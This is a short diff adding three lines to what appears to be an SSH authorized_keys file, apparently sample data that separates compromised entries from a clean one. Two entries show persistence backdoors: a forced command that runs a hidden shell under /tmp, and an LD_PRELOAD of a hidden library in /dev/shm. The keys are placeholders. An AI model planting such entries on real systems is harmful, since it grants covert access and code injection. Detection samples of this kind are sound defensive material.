@@ -1,0 +1,3 @@
+command="/tmp/.backdoor/shell" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7example attacker@c2
+environment="LD_PRELOAD=/dev/shm/.evil.so" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey compromised@host
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7normal user@clean
